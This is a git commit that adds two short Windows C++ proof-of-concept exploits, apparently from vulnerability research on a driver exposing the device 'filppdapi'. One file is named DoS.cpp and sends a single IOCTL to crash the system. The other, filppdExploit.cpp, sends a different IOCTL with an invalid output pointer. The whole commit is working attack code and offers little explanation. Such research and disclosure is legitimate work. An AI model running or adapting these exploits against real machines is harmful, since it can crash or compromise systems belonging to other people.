6db489faf4b75300c3ab3107bb2a449f83541ffe
zeze <zezectf@gmail.com>
2023-05-13 15:28:11 +0800

    feat: unassigned 43, 44

---
+++ unassigned43/bin/DoS.cpp
@@ -0,0 +1,25 @@
+﻿#include <iostream>
+#include <Windows.h>
+#include <winioctl.h>
+
+#define SymLinkName L"\\\\.\\filppdapi"
+
+HANDLE hDevice;
+
+
+int main(int argc, char* argv[])
+{
+    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
+    if (hDevice == INVALID_HANDLE_VALUE)
+    {
+        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
+        system("pause");
+        return 0;
+    }
+
+    DWORD dwWrite;
+    DeviceIoControl(hDevice, 0x804f2158, NULL, 0, NULL, 0, &dwWrite, NULL);
+
+    system("pause");
+    return 0;
+}
---
+++ unassigned44/filppdExploit.cpp
@@ -0,0 +1,26 @@
+﻿#include <iostream>
+#include <Windows.h>
+#include <winioctl.h>
+
+#define SymLinkName L"\\\\.\\filppdapi"
+
+HANDLE hDevice;
+
+
+int main(int argc, char* argv[])
+{
+    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
+    if (hDevice == INVALID_HANDLE_VALUE)
+    {
+        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
+        system("pause");
+        return 0;
+    }
+
+    DWORD dwWrite;
+    int output = 0;
+    DeviceIoControl(hDevice, 0x80800043, NULL, 0, LPVOID(1), 1, &dwWrite, NULL);
+
+    system("pause");
+    return 0;
+}
